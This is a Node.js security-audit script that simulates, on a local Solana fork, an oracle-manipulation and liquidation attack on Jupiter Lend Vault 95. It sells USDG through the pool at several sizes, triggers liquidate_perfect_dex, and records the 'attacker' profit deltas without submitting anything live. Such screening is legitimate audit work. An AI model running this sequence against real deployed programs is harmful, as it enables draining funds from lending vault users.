#!/usr/bin/env node
'use strict';

// Signed current-state local-fork screen for Vault 95's outsider-callable
// liquidate_perfect_dex consumer. Never submits a transaction.

const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const MODULES = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules';
const {PublicKey, Keypair, TransactionInstruction, TransactionMessage, SystemProgram,
  Connection} = require(path.join(MODULES, '@solana', 'web3.js'));
const {getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID} =
  require(path.join(MODULES, '@solana', 'spl-token'));
const {BorshAccountsCoder} = require(path.join(MODULES, '@coral-xyz', 'anchor'));
const BN = require(path.join(MODULES, 'bn.js'));
const {encodeV1} = require('../2026-10-15/klend-v1-composition.js');

const ROOT = __dirname;
const PRIOR = path.join(ROOT, '..', '2026-10-15');
const IDL_ROOT = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/jupiter-lend-current/public/idl';
const FORK = process.env.V95_FORK_RPC || 'http://127.0.0.1:9033';
const P = (value) => value instanceof PublicKey ? value : new PublicKey(value);
const PROGRAM = {
  vaults: P('jupr81YtYssSyPt8jbnGuiWon5f6x9TcDEFxYe3Bdzi'),
  oracle: P('jupnw4B6Eqs7ft6rxpzYLJZYSnrpRgPcr589n5Kv4oc'),
  dex: P('jupZ4m2GqUCJ5iueMfzQf8khFfH31d4XAQt3RzCT9Vd'),
  liquidity: P('jupeiUmn818Jg1ekPURTpr4mFo29p46vygyykFJ3wZC'),
};
const LIQUIDITY_ACCOUNT = P('7s1da8DduuBFqGra5bJBjpnvL5E9mGzCuMk1Qkh4or2Z');
const USDG = P('2u1tszSeqZ3qBWF3uNGPFc8TzMk2tdiwknnRMWGWjGWH');
const USDC = P('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
const path95 = JSON.parse(fs.readFileSync(path.join(PRIOR, 'jupiter-dex-peg-path-census.json')))
  .paths.find((row) => row.vaultId === 95);
const liquidityIdl = JSON.parse(fs.readFileSync(path.join(IDL_ROOT, 'liquidity.json')));
const liquidityCoder = new BorshAccountsCoder(liquidityIdl);
const dexIdl = JSON.parse(fs.readFileSync(path.join(IDL_ROOT, 'dex.json')));
const swapInSpec = dexIdl.instructions.find((row) => row.name === 'swap_in');
const DISC = {
  swapIn: Buffer.from([141, 172, 10, 208, 69, 9, 56, 154]),
  oracle: Buffer.from([92, 88, 161, 46, 230, 193, 46, 237]),
};

let requestId = 0;
async function rpc(method, params) {
  const response = await fetch(FORK, {method: 'POST', headers: {'content-type': 'application/json'},
    body: JSON.stringify({jsonrpc: '2.0', id: ++requestId, method, params})});
  const body = await response.json();
  if (body.error) throw new Error(`${method}: ${JSON.stringify(body.error)}`);
  return body.result;
}
const u16 = (value) => { const out = Buffer.alloc(2); out.writeUInt16LE(value); return out; };
const u64 = (value) => { const out = Buffer.alloc(8); out.writeBigUInt64LE(BigInt(value)); return out; };
function tokenAmount(row) {
  if (!row?.data) return null;
  const data = Buffer.from(row.data[0], 'base64');
  return data.length >= 72 ? data.readBigUInt64LE(64).toString() : null;
}
function oracleReturns(logs) {
  const prefix = `Program return: ${PROGRAM.oracle.toBase58()} `;
  return (logs || []).filter((line) => line.startsWith(prefix)).map((line) => {
    const data = Buffer.from(line.slice(prefix.length), 'base64');
    if (data.length === 16) {
      let liquidation = 0n;
      for (let index = 15; index >= 0; index--) liquidation = (liquidation << 8n) + BigInt(data[index]);
      return {liquidationRateX15: liquidation.toString()};
    }
    if (data.length < 32) return {otherReturnHex: data.toString('hex')};
    let supply = 0n, borrow = 0n;
    for (let index = 15; index >= 0; index--) supply = (supply << 8n) + BigInt(data[index]);
    for (let index = 31; index >= 16; index--) borrow = (borrow << 8n) + BigInt(data[index]);
    return {supplyRateX15: supply.toString(), borrowRateX15: borrow.toString()};
  });
}
async function setTokenAccount(templateAddress, target, mint, authority, amount) {
  const template = (await rpc('getAccountInfo', [String(templateAddress),
    {encoding: 'base64', commitment: 'processed'}])).value;
  if (!template) throw new Error(`Missing token template ${templateAddress}`);
  const data = Buffer.from(template.data[0], 'base64');
  if (!data.subarray(0, 32).equals(mint.toBuffer())) throw new Error('Token template mint mismatch');
  authority.toBuffer().copy(data, 32);
  data.writeBigUInt64LE(amount, 64);
  await rpc('surfnet_setAccount', [target.toBase58(), {data: data.toString('hex'), executable: false,
    lamports: template.lamports, owner: template.owner, rentEpoch: 0}]);
}
function signV1(instructions, signer, blockhash) {
  const encoded = encodeV1(instructions, signer.publicKey, blockhash);
  if (encoded.requiredSignatures !== 1) throw new Error('Unexpected signer count');
  const compiled = new TransactionMessage({payerKey: signer.publicKey, recentBlockhash: blockhash,
    instructions}).compileToV0Message();
  if (!compiled.staticAccountKeys[0].equals(signer.publicKey)) throw new Error('Signer ordering changed');
  const wire = Buffer.from(encoded.wire);
  const message = wire.subarray(0, wire.length - 64);
  const privateKey = crypto.createPrivateKey({key: Buffer.concat([
    Buffer.from('302e020100300506032b657004220420', 'hex'),
    Buffer.from(signer.secretKey.subarray(0, 32)),
  ]), format: 'der', type: 'pkcs8'});
  crypto.sign(null, message, privateKey).copy(wire, wire.length - 64);
  return {encoded, wire};
}

async function main() {
  const signer = Keypair.fromSecretKey(Uint8Array.from(JSON.parse(
    fs.readFileSync(path.join(os.homedir(), 'hooked.json'), 'utf8'))));
  const usdgAta = getAssociatedTokenAddressSync(USDG, signer.publicKey, false, TOKEN_2022_PROGRAM_ID);
  const usdcAta = getAssociatedTokenAddressSync(USDC, signer.publicKey, false, TOKEN_PROGRAM_ID);
  await rpc('surfnet_setAccount', [signer.publicKey.toBase58(), {data: '', executable: false,
    lamports: 20_000_000_000, owner: SystemProgram.programId.toBase58(), rentEpoch: 0}]);

  const reserveRows = await rpc('getMultipleAccounts', [[path95.tokenReserve0, path95.tokenReserve1],
    {encoding: 'base64', commitment: 'processed'}]);
  const reserve0 = liquidityCoder.decode('TokenReserve', Buffer.from(reserveRows.value[0].data[0], 'base64'));
  const reserve1 = liquidityCoder.decode('TokenReserve', Buffer.from(reserveRows.value[1].data[0], 'base64'));
  const syntheticStart = 30_000_000_000n;
  await setTokenAccount(reserve0.vault, usdgAta, USDG, signer.publicKey, syntheticStart);
  await setTokenAccount(reserve1.vault, usdcAta, USDC, signer.publicKey, syntheticStart);

  const positionPda = (seed, mint) => PublicKey.findProgramAddressSync([
    Buffer.from(seed), mint.toBuffer(), P(path95.dex).toBuffer()], PROGRAM.liquidity)[0];
  const ratePda = (mint) => PublicKey.findProgramAddressSync([
    Buffer.from('rate_model'), mint.toBuffer()], PROGRAM.liquidity)[0];
  const dexAccounts = [signer.publicKey, P(path95.dex), usdgAta, usdcAta,
    signer.publicKey, usdgAta, usdcAta, USDG, USDC,
    P(path95.tokenReserve0), P(path95.tokenReserve1), ratePda(USDG), ratePda(USDC),
    reserve0.vault, reserve1.vault, P(path95.dexPositionToken0), P(path95.dexPositionToken1),
    positionPda('user_borrow_position', USDG), positionPda('user_borrow_position', USDC),
    LIQUIDITY_ACCOUNT, PROGRAM.liquidity, TOKEN_2022_PROGRAM_ID, TOKEN_PROGRAM_ID, PROGRAM.oracle];
  const dexKeys = dexAccounts.map((pubkey, index) => ({pubkey,
    isSigner: !!swapInSpec.accounts[index].signer,
    isWritable: !!swapInSpec.accounts[index].writable}));
  const sellUsdg = (amount) => new TransactionInstruction({programId: PROGRAM.dex, keys: dexKeys,
    data: Buffer.concat([DISC.swapIn, Buffer.from([1]), u64(amount), u64(0n)])});
  const oracleIx = new TransactionInstruction({programId: PROGRAM.oracle, keys: [path95.oracle,
    path95.oracleSource, path95.dex, path95.dexPositionToken0, path95.dexPositionToken1,
    path95.tokenReserve0, path95.tokenReserve1].map((value) => ({pubkey: P(value),
    isSigner: false, isWritable: false})), data: Buffer.concat([DISC.oracle, u16(path95.oracleNonce)])});

  const {getLiquidatePerfectDexIx} = await import('../2026-10-15/jup6qf-sdk/dist/borrow/index.mjs');
  const liquidation = await getLiquidatePerfectDexIx({vaultId: 95,
    connection: new Connection(FORK, 'processed'), signer: signer.publicKey,
    debtAmt: new BN('18446744073709551615'), colPerUnitDebt: new BN(0),
    colAmounts: {token0PerUnitShares: new BN(0), token1PerUnitShares: new BN(0)},
    includeATASetup: false});
  const liquidateIx = liquidation.ixs.at(-1);
  const liquidatePreIxs = liquidation.ixs.slice(0, -1);
  if (liquidateIx.keys[12]?.pubkey.equals(liquidation.accounts.vaultSupplyPositionOnLiquidity))
    liquidateIx.keys[12].pubkey = PROGRAM.vaults;

  const watch = [usdgAta, usdcAta, P(path95.dex), P(path95.dexPositionToken0),
    P(path95.dexPositionToken1), P('44LQTsYEozMwkwXpMi9EjJocwyd25dqnkdHTeZ4Sd8DR')];
  const publicKeys = [...new Set([oracleIx, ...liquidation.ixs, sellUsdg(1n)]
    .flatMap((instruction) => instruction.keys.map((key) => key.pubkey.toBase58())))]
    .filter((address) => ![signer.publicKey, usdgAta, usdcAta]
      .some((key) => key.toBase58() === address));
  for (let offset = 0; offset < publicKeys.length; offset += 50)
    await rpc('getMultipleAccounts', [publicKeys.slice(offset, offset + 50),
      {encoding: 'base64', commitment: 'processed'}]);
  const before = await rpc('getMultipleAccounts', [watch.map(String),
    {encoding: 'base64', commitment: 'processed'}]);
  const blockhash = (await rpc('getLatestBlockhash', [{commitment: 'processed'}])).value.blockhash;
  const cases = [
    {label: 'oracle_control', instructions: [oracleIx]},
    {label: 'direct_liquidation_control', instructions: [...liquidatePreIxs, liquidateIx]},
    ...[300n, 400n, 500n, 600n, 800n, 2_000n, 5_000n, 10_000n,
      15_000n, 19_000n, 20_000n, 21_000n, 22_000n, 23_000n].flatMap((tokens) => {
      const amount = tokens * 1_000_000n;
      return [
        {label: `sell_${tokens}_oracle`, amount, instructions: [oracleIx, sellUsdg(amount), oracleIx]},
        {label: `sell_${tokens}_liquidate`, amount,
          instructions: [oracleIx, sellUsdg(amount), ...liquidatePreIxs, liquidateIx, oracleIx]},
      ];
    }),
  ];
  const results = [];
  for (const test of cases) {
    let result;
    try {
      const signed = signV1(test.instructions, signer, blockhash);
      const simulation = await rpc('simulateTransaction', [signed.wire.toString('base64'), {
        encoding: 'base64', sigVerify: true, replaceRecentBlockhash: false,
        commitment: 'processed', innerInstructions: true,
        accounts: {encoding: 'base64', addresses: watch.map(String)},
      }]);
      const accounts = simulation.value.accounts || [];
      result = {label: test.label, manipulationInputRaw: test.amount?.toString() || null,
        err: simulation.value.err, unitsConsumed: simulation.value.unitsConsumed,
        wireBytes: signed.encoded.sizeBytes, addressCount: signed.encoded.addressCount,
        instructionCount: signed.encoded.instructionCount,
        requiredSignatures: signed.encoded.requiredSignatures,
        oracleReturns: oracleReturns(simulation.value.logs),
        attackerUsdgPostRaw: tokenAmount(accounts[0]), attackerUsdcPostRaw: tokenAmount(accounts[1]),
        attackerUsdgDeltaRaw: accounts[0] ? (BigInt(tokenAmount(accounts[0])) - syntheticStart).toString() : null,
        attackerUsdcDeltaRaw: accounts[1] ? (BigInt(tokenAmount(accounts[1])) - syntheticStart).toString() : null,
        lastLogs: simulation.value.logs?.slice(-24),
      };
    } catch (error) {
      result = {label: test.label, manipulationInputRaw: test.amount?.toString() || null,
        localError: error.stack};
    }
    results.push(result);
    console.log(JSON.stringify({label: result.label, err: result.err,
      localError: result.localError?.split('\n')[0], bytes: result.wireBytes,
      addresses: result.addressCount, rates: result.oracleReturns,
      usdgDelta: result.attackerUsdgDeltaRaw, usdcDelta: result.attackerUsdcDeltaRaw,
      lastLogs: result.err ? result.lastLogs?.slice(-6) : undefined}));
  }
  const output = {generatedAt: new Date().toISOString(), fork: FORK,
    scope: 'signed current-state local-fork liquidation screen; no mainnet submission',
    signerSource: '~/hooked.json (private bytes not retained)', signatureVerification: true,
    liveSubmission: false, syntheticStartingBalances: {usdgRaw: syntheticStart.toString(),
      usdcRaw: syntheticStart.toString()}, target: {vaultId: 95, vaultConfig: path95.vaultConfig,
      oracle: path95.oracle, dexPoolA: path95.dex}, liquidation: {
      accountCount: liquidateIx.keys.length, preInstructions: liquidatePreIxs.length,
      remainingAccountsIndices: [...liquidation.remainingAccountsIndices]},
    watch: watch.map((address) => address.toBase58()),
    before: before.value.map((row) => ({amountRaw: tokenAmount(row), lamports: row?.lamports ?? null})),
    results};
  fs.writeFileSync(path.join(ROOT, 'jupiter-v95-liquidation-screen.json'),
    `${JSON.stringify(output, null, 2)}\n`);
}

main().catch((error) => { console.error(error.stack || error); process.exitCode = 1; });
